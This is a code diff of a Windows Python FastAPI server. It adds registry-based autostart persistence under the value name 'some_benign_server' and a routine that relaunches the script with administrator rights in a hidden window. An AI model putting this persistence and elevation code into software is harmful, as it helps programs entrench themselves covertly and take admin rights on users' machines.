@@ -7,7 +7,9 @@ import psutil
 import os
 import ctypes
 import winreg as reg   
-
+from sqlalchemy import create_engine
+import pandas
+import sys
 app = FastAPI()
 
 # backend_crypto.generate_keys()
@@ -65,10 +67,12 @@ def set_watchdog():
 
 
 def persistence():
-    with open('start.bat','w') as f:
-        f.write(f'CD \"{str(os.getcwd())}\"\n')
-        f.write('python main.py\nexit')
-
+    try:
+        with open('start.bat','w') as f:
+            f.write(f'chdir /d \"{str(os.getcwd())}\"\n')
+            f.write(f'python \"{str(os.getcwd())}\main.py\"\nexit')
+    except Exception as e:
+        print(e)
 
 
     current_path = str(os.getcwd()) + '\\start.bat'       
@@ -78,8 +82,22 @@ def persistence():
         reg.SetValueEx(open_,"some_benign_server",0,reg.REG_SZ,current_path)
         reg.CloseKey(open_)
 
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+
+def check_if_admin():
+    if not is_admin():
+        print(" ".join(sys.argv))
+        params = " ".join(sys.argv)
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 0)
+        sys.exit()
 
 def main():
+    #check_if_admin()
     #ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "server_main_pid", 1)
     uvicorn.run("main:app", port=443, host='127.0.0.1', reload = True)
 
@@ -88,6 +106,7 @@ def main():
 
 
 if __name__ == "__main__":
+    ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "server", 1)
     #uvicorn.run(app, host="127.0.0.1", port=8075)
     persistence()
     print(f'server main pid: {str(os.getpid())}')
